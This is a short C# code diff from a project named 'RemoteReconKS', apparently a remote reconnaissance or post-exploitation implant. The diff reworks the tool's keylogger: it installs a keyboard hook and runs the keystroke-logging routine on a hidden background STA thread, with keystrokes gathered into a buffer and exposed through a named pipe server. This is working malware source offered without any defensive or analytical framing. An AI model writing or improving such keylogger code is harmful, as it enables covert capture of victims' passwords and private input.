@@ -4,7 +4,6 @@ using System.IO.Pipes;
 using System.Windows.Forms;
 using System.Drawing;
 using System.Drawing.Imaging;
-using System.Threading.Tasks;
 using System.Threading;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
@@ -18,14 +17,6 @@ namespace RemoteReconKS
         private static NamedPipeServerStream server;
         private static StreamWriter sw;
         private static StringBuilder keylogoutput = new StringBuilder();
-
-        public static void Main(string[] arg)
-        {
-#if DEBUG
-            Execute("screenshot");
-#else
-#endif
-        }
 
         public static void Execute(string capability)
         {
@@ -76,8 +67,12 @@ namespace RemoteReconKS
         {
             //Start a background thread for the keylogger
             WinApi._hookID = SetHook(WinApi._proc);
-            Action runner = new Action(LogKeyStrokes);
-            Task t = new Task(runner);
+            Thread t = new Thread(() =>
+            {
+                LogKeyStrokes();
+            });
+            t.SetApartmentState(ApartmentState.STA);
+            t.IsBackground = true;
             t.Start();
 #if DEBUG
             File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", "Starting Application loop");
